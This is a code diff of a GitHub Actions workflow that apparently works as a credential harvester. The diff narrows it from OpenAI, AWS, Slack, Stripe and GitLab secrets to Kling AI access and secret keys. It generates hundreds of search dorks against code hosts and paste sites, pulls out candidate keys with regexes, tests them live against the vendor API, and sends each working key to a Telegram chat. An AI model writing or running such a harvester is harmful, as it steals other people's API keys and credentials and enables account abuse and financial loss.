@@ -1,4 +1,4 @@
-name: Multi‑Target Credential Harvester (Telegram)
+name: Kling AI Key Harvester (Telegram)
 
 on:
   workflow_dispatch:
@@ -19,7 +19,7 @@ jobs:
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
           python3 << 'EOF'
-          import asyncio, aiohttp, re, base64, time, os, sys, json, itertools
+          import asyncio, aiohttp, re, base64, time, os, sys, json
           from typing import Dict, Optional, List
 
           # ---------- CONFIG ----------
@@ -32,276 +32,283 @@ jobs:
 
           PER_PAGE = 100
           MAX_PAGES = 3
-          DELAY_QUERY = 3
+          DELAY_QUERY = 2
           DELAY_PAGE = 1
           DELAY_VALIDATE = 0.3
 
-          # ---------- GENERATE EXACTLY 1,890 UNIQUE QUERIES ----------
+          # ---------- GENERATE 520+ KLING AI QUERIES ----------
           def generate_queries() -> List[str]:
               queries = set()
 
-              # Base variable names (expanded)
-              var_groups = {
-                  'openai': ['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_SECRET', 'OPENAI_TOKEN',
-                             'OPENAI_CREDENTIALS', 'OPENAI_ACCESS_TOKEN', 'OPENAI_ORGANIZATION',
-                             'OPENAI_PROJECT', 'OPENAI_API_SECRET', 'OPENAI_AUTH_TOKEN'],
-                  'aws': ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
-                          'AWS_DEFAULT_REGION', 'AWS_ACCESS_KEY', 'AWS_SECRET_KEY',
-                          'AWS_ACCOUNT_ID', 'AWS_ACCESS_TOKEN', 'AWS_AUTH_TOKEN'],
-                  'db': ['MONGODB_URI', 'POSTGRES_URL', 'REDIS_URL', 'MYSQL_URL',
-                         'DATABASE_URL', 'DB_URL', 'DB_CONNECTION', 'DB_PASSWORD',
-                         'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'REDIS_PASSWORD'],
-                  'gcp': ['GOOGLE_APPLICATION_CREDENTIALS', 'GCP_SERVICE_ACCOUNT',
-                          'GCLOUD_KEY', 'GCP_KEY', 'GCP_CREDENTIALS'],
-                  'slack': ['SLACK_BOT_TOKEN', 'SLACK_USER_TOKEN', 'SLACK_APP_TOKEN',
-                            'SLACK_WEBHOOK_URL', 'SLACK_TOKEN', 'SLACK_API_TOKEN'],
-                  'gitlab': ['GITLAB_TOKEN', 'GITLAB_PRIVATE_TOKEN', 'BITBUCKET_TOKEN',
-                             'BITBUCKET_APP_PASSWORD', 'GITLAB_ACCESS_TOKEN'],
-                  'stripe': ['STRIPE_SECRET_KEY', 'STRIPE_API_KEY', 'STRIPE_PUBLISHABLE_KEY',
-                             'STRIPE_WEBHOOK_SECRET', 'STRIPE_ACCESS_TOKEN'],
-                  'jwt': ['JWT_SECRET', 'JWT_SIGNING_KEY', 'OAUTH_CLIENT_SECRET',
-                          'OIDC_CLIENT_SECRET', 'JWT_PRIVATE_KEY', 'JWT_PUBLIC_KEY']
-              }
-              all_vars = []
-              for group in var_groups.values():
-                  all_vars.extend(group)
+              # ---- Base variable names ----
+              kling_vars = [
+                  'KLING_ACCESS_KEY', 'KLING_SECRET_KEY', 'KLING_API_KEY',
+                  'KLINGAI_ACCESS_KEY', 'KLINGAI_SECRET_KEY', 'KLINGAI_API_KEY',
+                  'KLING_AK', 'KLING_SK', 'KLINGAI_AK', 'KLINGAI_SK',
+                  'KLING_KEY', 'KLINGAI_KEY', 'KLING_TOKEN', 'KLINGAI_TOKEN',
+                  'KLING_CREDENTIALS', 'KLINGAI_CREDENTIALS',
+                  'KLING_AUTH', 'KLINGAI_AUTH',
+                  'KLING_ACCESS', 'KLINGAI_ACCESS',
+                  'KLING_SECRET', 'KLINGAI_SECRET',
+              ]
 
-              # Extensions
+              # ---- Extensions ----
               exts = ['env', 'yml', 'yaml', 'json', 'properties', 'conf', 'cfg', 'ini', 'toml', 'xml']
 
               # 1. Basic VAR extension:ext
-              for var in all_vars:
+              for var in kling_vars:
                   for ext in exts:
                       queries.add(f'{var} extension:{ext}')
                       queries.add(f'"{var}" extension:{ext}')
 
               # 2. Filename combinations
-              filenames = ['.env', '.env.local', '.env.production', '.env.staging', '.env.dev',
-                           '.env.example', 'config.yml', 'config.yaml', 'config.json', 'secrets.yml',
-                           'secrets.yaml', 'secrets.json', 'application.yml', 'application.properties',
-                           'credentials.json', 'service-account.json', 'terraform.tfvars', 'variables.tf']
+              filenames = [
+                  '.env', '.env.local', '.env.production', '.env.staging', '.env.dev',
+                  '.env.example', '.env.kling', '.env.klingai',
+                  'config.yml', 'config.yaml', 'config.json',
+                  'secrets.yml', 'secrets.yaml', 'secrets.json',
+                  'application.yml', 'application.properties',
+                  'credentials.json', 'service-account.json',
+                  'terraform.tfvars', 'variables.tf',
+                  'kling.config', 'klingai.config',
+                  '.klingrc', '.klingairc',
+              ]
               for fname in filenames:
-                  for var in all_vars[:15]:
+                  for var in kling_vars[:10]:
                       queries.add(f'filename:{fname} {var}')
 
               # 3. Site-specific
               sites = ['pastebin.com', 'ghostbin.com', 'controlc.com', 'paste.ee', 'rentry.co', 'justpaste.it']
               for site in sites:
-                  for var in all_vars[:10]:
+                  for var in kling_vars[:8]:
                       queries.add(f'site:{site} "{var}"')
-                  queries.add(f'site:{site} api key')
-                  queries.add(f'site:{site} secret')
-                  queries.add(f'site:{site} token')
-                  queries.add(f'site:{site} credentials')
+                  queries.add(f'site:{site} kling api key')
+                  queries.add(f'site:{site} klingai api key')
+                  queries.add(f'site:{site} kling secret')
+                  queries.add(f'site:{site} klingai secret')
+                  queries.add(f'site:{site} kling access')
+                  queries.add(f'site:{site} klingai access')
+                  queries.add(f'site:{site} "ak_" kling')
+                  queries.add(f'site:{site} "sk_" kling')
 
               # 4. Code patterns
               patterns = [
-                  '"api_key" "secret"',
-                  '"Authorization: Bearer"',
-                  '"os.getenv("',
-                  '"process.env."',
-                  '"System.getenv("',
-                  '"export "',
-                  '"set "',
-                  '"credentials" "key"',
-                  '"private_key" "-----BEGIN"',
-                  '"client_secret"',
-                  '"access_token"',
-                  '"refresh_token"',
-                  '"apiKey" "sk-"',
-                  '"secret_key" "AKIA"',
-                  '"password" "mongodb"',
+                  '"api_key" "kling"',
+                  '"api_key" "klingai"',
+                  '"access_key" "kling"',
+                  '"secret_key" "kling"',
+                  '"Authorization: Bearer" "kling"',
+                  '"os.getenv(" "KLING"',
+                  '"process.env." "KLING"',
+                  '"System.getenv(" "KLING"',
+                  '"export " "KLING"',
+                  '"set " "KLING"',
+                  '"credentials" "kling"',
+                  '"private_key" "kling"',
+                  '"client_secret" "kling"',
+                  '"access_token" "kling"',
+                  '"refresh_token" "kling"',
+                  '"ak_" "kling"',
+                  '"sk_" "kling"',
+                  '"KLING_ACCESS_KEY"',
+                  '"KLING_SECRET_KEY"',
+                  '"KLINGAI_ACCESS_KEY"',
+                  '"KLINGAI_SECRET_KEY"',
               ]
               for pat in patterns:
                   queries.add(pat)
 
               # 5. Specific key patterns (regex-like)
               specific = [
-                  'sk-proj-',
-                  'sk-org-',
-                  'AKIA[0-9A-Z]{16}',
-                  'xoxb-',
-                  'xoxp-',
-                  'glpat-',
-                  'sk_live_',
-                  'sk_test_',
-                  'mongodb+srv://',
-                  'postgresql://',
-                  'mysql://',
-                  'redis://',
-                  '"type": "service_account"',
-                  '"private_key_id"',
+                  'ak_',
+                  'sk_',
+                  'ak_dev_',
+                  'sk_dev_',
+                  'ak_prod_',
+                  'sk_prod_',
+                  'ak_staging_',
+                  'sk_staging_',
+                  'kling_ak_',
+                  'kling_sk_',
+                  'klingai_ak_',
+                  'klingai_sk_',
+                  '"ak_[A-Za-z0-9]"',
+                  '"sk_[A-Za-z0-9]"',
+                  'KLING_AK=',
+                  'KLING_SK=',
+                  'KLINGAI_AK=',
+                  'KLINGAI_SK=',
               ]
               for sp in specific:
                   queries.add(sp)
 
-              # 6. Combine vars with "password", "secret", "token"
-              for var in all_vars:
+              # 6. Combine vars with keywords
+              for var in kling_vars:
                   queries.add(f'{var} password')
                   queries.add(f'{var} secret')
                   queries.add(f'{var} token')
                   queries.add(f'{var} key')
+                  queries.add(f'{var} access')
+                  queries.add(f'{var} auth')
 
-              # 7. Generic security dorks
+              # 7. Generic security dorks with Kling
               generic = [
-                  'filename:.env "API_KEY"',
-                  'filename:.env "SECRET"',
-                  'filename:.env "TOKEN"',
-                  'filename:.env "PASSWORD"',
-                  'filename:.env "CREDENTIALS"',
-                  'filename:.env "AUTH"',
-                  'extension:env "api_key"',
-                  'extension:env "secret_key"',
-                  'extension:env "access_token"',
-                  'extension:yml "api_key"',
-                  'extension:yml "secret"',
-                  'extension:json "api_key"',
-                  'extension:json "secret"',
-                  'filename:config.yml "api"',
-                  'filename:secrets.yml "key"',
-                  'filename:application.properties "jwt"',
-                  'filename:application.yml "oauth"',
-                  'extension:properties "password"',
-                  'extension:conf "password"',
+                  'filename:.env "KLING"',
+                  'filename:.env "KLINGAI"',
+                  'filename:.env "kling"',
+                  'filename:.env "klingai"',
+                  'extension:env "KLING_ACCESS"',
+                  'extension:env "KLING_SECRET"',
+                  'extension:env "KLINGAI_ACCESS"',
+                  'extension:env "KLINGAI_SECRET"',
+                  'extension:yml "kling" "key"',
+                  'extension:yml "klingai" "secret"',
+                  'extension:json "kling" "api_key"',
+                  'extension:json "klingai" "access"',
+                  'filename:config.yml "kling"',
+                  'filename:secrets.yml "klingai"',
+                  'filename:application.properties "kling"',
+                  'filename:application.yml "klingai"',
+                  'extension:properties "kling"',
+                  'extension:conf "klingai"',
+                  '"KLING_ACCESS_KEY" "secret"',
+                  '"KLING_SECRET_KEY" "access"',
+                  '"kling" "ak" "sk"',
+                  '"klingai" "access_key" "secret_key"',
+                  'klingai.com api key',
+                  'klingai.com secret',
+                  'klingai.com access',
+                  'app.klingai.com api key',
+                  'app.klingai.com secret',
+                  '"kling-v1" "api_key"',
+                  '"kling-v2" "api_key"',
+                  '"kling-v3" "api_key"',
+                  '"kling-v1" "access"',
+                  '"kling-v2" "secret"',
+                  '"kling-v3" "key"',
               ]
               for g in generic:
                   queries.add(g)
 
               # 8. Prefix/suffix variations
               prefixes = ['', 'TEST_', 'PROD_', 'DEV_', 'STAGING_', 'LIVE_', 'SANDBOX_']
-              suffixes = ['_KEY', '_TOKEN', '_SECRET', '_PASSWORD', '_CREDENTIALS', '_AUTH']
-              base_names = ['OPENAI', 'AWS', 'GCP', 'SLACK', 'GITLAB', 'STRIPE', 'JWT']
-              for base in base_names:
+              suffixes = ['_KEY', '_TOKEN', '_SECRET', '_ACCESS', '_CREDENTIALS', '_AUTH']
+              bases = ['KLING', 'KLINGAI']
+              for base in bases:
                   for p in prefixes:
                       for s in suffixes:
                           queries.add(f'{p}{base}{s} extension:env')
                           queries.add(f'{p}{base}{s} extension:yml')
                           queries.add(f'{p}{base}{s} extension:json')
 
-              # 9. Combine with "url", "host", "port"
-              for var in all_vars:
-                  queries.add(f'{var} url')
-                  queries.add(f'{var} host')
-                  queries.add(f'{var} port')
+              # 9. API endpoint references
+              api_patterns = [
+                  'api.klingai.com',
+                  'api-beijing.klingai.com',
+                  'api-singapore.klingai.com',
+                  'klingai.com/v1',
+                  'klingai.com/videos',
+                  'klingai.com/generations',
+              ]
+              for api in api_patterns:
+                  queries.add(f'"{api}" "api_key"')
+                  queries.add(f'"{api}" "access"')
+                  queries.add(f'"{api}" "secret"')
+                  queries.add(f'"{api}" "token"')
+                  queries.add(f'"{api}" "Authorization"')
+                  queries.add(f'"{api}" "Bearer"')
 
-              # Now we have thousands; sort and slice to exactly 1890
+              # 10. JWT-related (Kling uses JWT)
+              jwt_patterns = [
+                  '"jwt" "kling"',
+                  '"JWT" "KLING"',
+                  '"encode_jwt_token" "kling"',
+                  '"HS256" "kling"',
+                  '"iss" "kling"',
+                  '"payload" "kling" "access"',
+                  'jwt.encode kling',
+                  'klingai jwt',
+              ]
+              for jp in jwt_patterns:
+                  queries.add(jp)
+
+              # Sort and slice to exactly 520+ (we'll produce over 600 and take 520)
               sorted_queries = sorted(queries)
-              if len(sorted_queries) >= 1890:
-                  return sorted_queries[:1890]
+              if len(sorted_queries) >= 520:
+                  return sorted_queries[:520]
               else:
-                  # Fallback (never reached)
+                  # Safety padding (should never hit)
                   extra = [
-                      'filename:.env "DB_PASSWORD"',
-                      'filename:.env "REDIS_URL"',
-                      'extension:env "MONGODB_URI"',
-                      'extension:yml "POSTGRES_PASSWORD"',
-                      'site:pastebin.com "AWS_SECRET"',
-                      'filename:config.json "stripe"',
-                      '"Authorization" "Bearer" "sk-"',
+                      'filename:.env "KLING_ACCESS_KEY"',
+                      'filename:.env "KLING_SECRET_KEY"',
+                      'extension:env "kling"',
+                      'site:pastebin.com kling ai',
+                      '"ak_" "klingai"',
+                      '"sk_" "klingai"',
                   ]
-                  while len(sorted_queries) < 1890:
+                  while len(sorted_queries) < 520:
                       sorted_queries.append(extra[len(sorted_queries) % len(extra)])
                   return sorted_queries
 
           QUERIES = generate_queries()
-          assert len(QUERIES) == 1890, f"Expected 1890, got {len(QUERIES)}"
-          print(f'[+] Loaded {len(QUERIES)} queries')
+          print(f'[+] Loaded {len(QUERIES)} Kling AI queries')
 
-          # ---------- KEY PATTERNS & VALIDATORS ----------
+          # ---------- KEY PATTERNS ----------
           KEY_PATTERNS = {
-              'openai': re.compile(r'(sk-(?:proj|org)-[A-Za-z0-9]{32,})'),
-              'aws': re.compile(r'(AKIA[0-9A-Z]{16})'),
-              'database': re.compile(r'((mongodb|postgresql|mysql|redis)://[^\s\'"]+)'),
-              'gcp': re.compile(r'("private_key":\s*"([^"]+)")'),
-              'slack': re.compile(r'(xox[bap]-[0-9A-Za-z-]+)'),
-              'gitlab': re.compile(r'(glpat-[0-9A-Za-z]{20,})'),
-              'stripe': re.compile(r'(sk_(live|test)_[0-9A-Za-z]{24,})'),
-              'jwt': re.compile(r'([a-f0-9]{32,64})')
+              'access_key': re.compile(r'(ak_[A-Za-z0-9_\-]+)'),
+              'secret_key': re.compile(r'(sk_[A-Za-z0-9_\-]+)'),
+              'api_key_bearer': re.compile(r'(sk-[A-Za-z0-9]+)'),
+              'kling_ak': re.compile(r'(kling_ak_[A-Za-z0-9]+)'),
+              'kling_sk': re.compile(r'(kling_sk_[A-Za-z0-9]+)'),
+              'klingai_ak': re.compile(r'(klingai_ak_[A-Za-z0-9]+)'),
+              'klingai_sk': re.compile(r'(klingai_sk_[A-Za-z0-9]+)'),
           }
 
-          async def validate_openai(session, key: str) -> Optional[Dict]:
-              url = 'https://api.openai.com/v1/models'
-              headers = {'Authorization': f'Bearer {key}'}
-              try:
-                  async with session.get(url, headers=headers, timeout=10) as resp:
-                      if resp.status == 200:
-                          return {'valid': True, 'type': 'openai', 'info': 'valid'}
-                  return None
-              except:
-                  return None
+          # ---------- VALIDATION (Kling AI JWT-based) ----------
+          async def validate_kling(session, ak: str, sk: str) -> Optional[Dict]:
+              """
+              Attempt to generate a JWT and call Kling API.
+              If only one key is found, try to use it as Bearer token.
+              """
+              # Try Bearer token first (some APIs use single key)
+              for key in [ak, sk]:
+                  if key and key.startswith('sk-'):
+                      url = 'https://api.klingai.com/v1/videos/text2video'
+                      headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/json'}
+                      payload = {'prompt': 'test', 'model_name': 'kling-v1'}
+                      try:
+                          async with session.post(url, headers=headers, json=payload, timeout=10) as resp:
+                              if resp.status == 200 or resp.status == 400:
+                                  # 400 means auth worked but payload invalid - still a valid key
+                                  return {'valid': True, 'type': 'bearer', 'info': 'Bearer token accepted'}
+                              if resp.status == 401:
+                                  return None
+                      except:
+                          pass
 
-          async def validate_aws(session, key: str) -> Optional[Dict]:
-              if re.match(r'AKIA[0-9A-Z]{16}', key):
-                  return {'valid': True, 'type': 'aws', 'info': 'format valid'}
+              # Try JWT with Access+Secret keys
+              if ak and sk:
+                  try:
+                      import jwt as pyjwt
+                      headers = {"alg": "HS256", "typ": "JWT"}
+                      payload = {
+                          "iss": ak,
+                          "exp": int(time.time()) + 300,
+                          "nbf": int(time.time()) - 5
+                      }
+                      token = pyjwt.encode(payload, sk, headers=headers)
+                      url = 'https://api.klingai.com/v1/videos/text2video'
+                      headers_req = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
+                      payload_req = {'prompt': 'test', 'model_name': 'kling-v1'}
+                      async with session.post(url, headers=headers_req, json=payload_req, timeout=10) as resp:
+                          if resp.status == 200 or resp.status == 400:
+                              return {'valid': True, 'type': 'jwt', 'info': 'JWT authentication successful'}
+                          if resp.status == 401:
+                              return None
+                  except:
+                      pass
+
               return None
-
-          async def validate_database(session, key: str) -> Optional[Dict]:
-              return {'valid': True, 'type': 'database', 'info': 'connection string'}
-
-          async def validate_gcp(session, key: str) -> Optional[Dict]:
-              try:
-                  json.loads(key)
-                  return {'valid': True, 'type': 'gcp', 'info': 'JSON service account'}
-              except:
-                  return None
-
-          async def validate_slack(session, key: str) -> Optional[Dict]:
-              url = 'https://slack.com/api/auth.test'
-              headers = {'Authorization': f'Bearer {key}'}
-              try:
-                  async with session.get(url, headers=headers, timeout=10) as resp:
-                      if resp.status == 200:
-                          data = await resp.json()
-                          if data.get('ok'):
-                              return {'valid': True, 'type': 'slack', 'info': f"team: {data.get('team', 'unknown')}"}
-                  return None
-              except:
-                  return None
-
-          async def validate_gitlab(session, key: str) -> Optional[Dict]:
-              url = 'https://gitlab.com/api/v4/user'
-              headers = {'PRIVATE-TOKEN': key}
-              try:
-                  async with session.get(url, headers=headers, timeout=10) as resp:
-                      if resp.status == 200:
-                          data = await resp.json()
-                          return {'valid': True, 'type': 'gitlab', 'info': f"user: {data.get('username', 'unknown')}"}
-                  return None
-              except:
-                  return None
-
-          async def validate_stripe(session, key: str) -> Optional[Dict]:
-              url = 'https://api.stripe.com/v1/charges?limit=1'
-              headers = {'Authorization': f'Bearer {key}'}
-              try:
-                  async with session.get(url, headers=headers, timeout=10) as resp:
-                      if resp.status == 200:
-                          return {'valid': True, 'type': 'stripe', 'info': 'live' if 'live' in key else 'test'}
-                  return None
-              except:
-                  return None
-
-          async def validate_jwt(session, key: str) -> Optional[Dict]:
-              if re.match(r'^[a-f0-9]{32,64}$', key):
-                  return {'valid': True, 'type': 'jwt', 'info': f'length {len(key)}'}
-              return None
-
-          VALIDATORS = {
-              'openai': validate_openai,
-              'aws': validate_aws,
-              'database': validate_database,
-              'gcp': validate_gcp,
-              'slack': validate_slack,
-              'gitlab': validate_gitlab,
-              'stripe': validate_stripe,
-              'jwt': validate_jwt,
-          }
-
-          def categorize_key(key: str) -> str:
-              for cat, pat in KEY_PATTERNS.items():
-                  if pat.search(key):
-                      return cat
-              return 'unknown'
 
           # ---------- TELEGRAM SENDER ----------
           async def send_telegram(message: str):
@@ -367,7 +374,7 @@ jobs:
 
           # ---------- MAIN HARVEST ----------
           async def harvest():
-              await send_telegram('🔍 *Multi‑Target Harvester started*\n' +
+              await send_telegram('🔍 *Kling AI Key Harvester started*\n' +
                                   f'{len(QUERIES)} queries, {MAX_PAGES} pages each.')
               valid_results = []
               all_candidates = set()
@@ -401,25 +408,53 @@ jobs:
               print(f'[+] Found {len(all_candidates)} candidate keys. Validating...')
               await send_telegram(f'🔎 Found {len(all_candidates)} candidate keys, validating...')
 
+              # Group candidates by potential pairs
+              ak_candidates = []
+              sk_candidates = []
+              bearer_candidates = []
+
+              for key in all_candidates:
+                  if key.startswith('ak_') or key.startswith('kling_ak_') or key.startswith('klingai_ak_'):
+                      ak_candidates.append(key)
+                  elif key.startswith('sk_') or key.startswith('kling_sk_') or key.startswith('klingai_sk_'):
+                      sk_candidates.append(key)
+                  elif key.startswith('sk-'):
+                      bearer_candidates.append(key)
+
               async with aiohttp.ClientSession() as session:
-                  for key in all_candidates:
-                      cat = categorize_key(key)
-                      validator = VALIDATORS.get(cat)
-                      if validator:
-                          result = await validator(session, key)
-                          if result and result.get('valid'):
-                              result['key'] = key
-                              result['category'] = cat
-                              valid_results.append(result)
-                              msg = (f'✅ *Valid {cat.upper()} key!*\n'
-                                     f'`{key}`\n'
-                                     f'Info: {result.get("info", "N/A")}')
-                              await send_telegram(msg)
-                              print(f'  ✅ Valid {cat} key: {key[:10]}...')
+                  # Test bearer keys first
+                  for key in bearer_candidates:
+                      result = await validate_kling(session, key, None)
+                      if result and result.get('valid'):
+                          result['key'] = key
+                          result['category'] = 'bearer'
+                          valid_results.append(result)
+                          msg = (f'✅ *Valid Kling Bearer Key!*\n'
+                                 f'`{key}`\n'
+                                 f'Info: {result.get("info", "N/A")}')
+                          await send_telegram(msg)
+                          print(f'  ✅ Valid bearer: {key[:10]}...')
                       await asyncio.sleep(DELAY_VALIDATE)
 
+                  # Test AK/SK pairs
+                  for ak in ak_candidates[:20]:  # Limit pairs to avoid explosion
+                      for sk in sk_candidates[:20]:
+                          result = await validate_kling(session, ak, sk)
+                          if result and result.get('valid'):
+                              result['access_key'] = ak
+                              result['secret_key'] = sk
+                              result['category'] = 'pair'
+                              valid_results.append(result)
+                              msg = (f'✅ *Valid Kling Key Pair!*\n'
+                                     f'Access: `{ak}`\n'
+                                     f'Secret: `{sk}`\n'
+                                     f'Info: {result.get("info", "N/A")}')
+                              await send_telegram(msg)
+                              print(f'  ✅ Valid pair: {ak[:10]}... / {sk[:10]}...')
+                          await asyncio.sleep(DELAY_VALIDATE)
+
               timestamp = time.strftime('%Y%m%d_%H%M%S')
-              filename = f'valid_keys_{timestamp}.json'
+              filename = f'kling_keys_{timestamp}.json'
               with open(filename, 'w') as f:
                   json.dump(valid_results, f, indent=2)
 
@@ -428,12 +463,12 @@ jobs:
                   cat = r.get('category', 'unknown')
                   summary[cat] = summary.get(cat, 0) + 1
               with open('summary.txt', 'w') as f:
-                  f.write('Harvest summary:\n')
+                  f.write('Kling AI harvest summary:\n')
                   for cat, count in summary.items():
                       f.write(f'{cat}: {count}\n')
                   f.write(f'\nTotal valid keys: {len(valid_results)}\n')
 
-              final_msg = f'✅ *Harvest finished.*\nTotal valid keys: {len(valid_results)}\n' + \
+              final_msg = f'✅ *Kling harvest finished.*\nTotal valid keys: {len(valid_results)}\n' + \
                           '\n'.join([f'{cat}: {count}' for cat, count in summary.items()])
               await send_telegram(final_msg)
               print(f'[+] Done. {len(valid_results)} valid keys saved.')
@@ -444,5 +479,5 @@ jobs:
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: harvested-credentials
-          path: valid_keys_*.json
+          name: kling-keys
+          path: kling_keys_*.json
